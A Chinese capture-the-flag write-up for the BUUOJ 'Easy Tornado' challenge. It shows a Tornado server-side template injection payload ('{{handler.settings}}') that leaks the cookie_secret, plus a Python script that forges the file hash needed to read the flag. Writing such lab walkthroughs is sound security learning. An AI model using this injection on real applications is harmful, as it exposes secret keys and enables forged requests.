### buuoj_[护网杯 2018]Easy Tonado

首先先看一下每个文件里面的内容

> /flag.txt
> flag in /fllllllllllllag
>
> /welcome.txt
> render
>
> /hints.txt
> md5(cookie_secret+md5(filename))

并且查看文件时，可以看见url格式是

```
file?filename=/flag.txt&filehash=4543b2a987e42dfb928c957aa9a0100b
```

而且猜测filehash的值就是hints.txt中的加密方式

但是如何获得cookie-secret呢

看到有render，猜测可能有ssti注入

从url下手，修改url的内容，把filehash的部分直接删掉，发现报错了

![](https://pic.imgdb.cn/item/61014ed55132923bf8641e17.jpg)

但是此时可以看到url变成了这个样子

```
error?msg=Error
```

尝试读一下

```
error?msg={{1*1}}
```

不太行，毫希昂杯过滤了。。。。好了gg了，看看大佬的wp

> Tornado框架
>
> 在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以[参考Tornado官方文档](http://tornado.readthedocs.org/en/latest/guide/templates.html#template-syntax)！
>
> 这里我想将的是Handler这个对象，Handler指向的处理当前这个页面的RequestHandler对象！

```
error?msg={{handler.settings}}
```

成功得到cookie-secret，然后看到这个格式，用md5加密一下

![](https://pic.imgdb.cn/item/6101561c5132923bf87ba105.jpg)

```
import hashlib

def md5encode(code):
    m = hashlib.md5(str(code).encode("utf-8"))

    return m.hexdigest()

filename = '/fllllllllllllag'
cookie_secret = '2848af1e-24ea-4264-8003-a563009d621e'
a = md5encode((cookie_secret + md5encode(filename)))
print(a)
```

```
构造playload：file?filename=/fllllllllllllag&filehash=92a27f6dd76e16837d512c3adda41e00
```

得到flag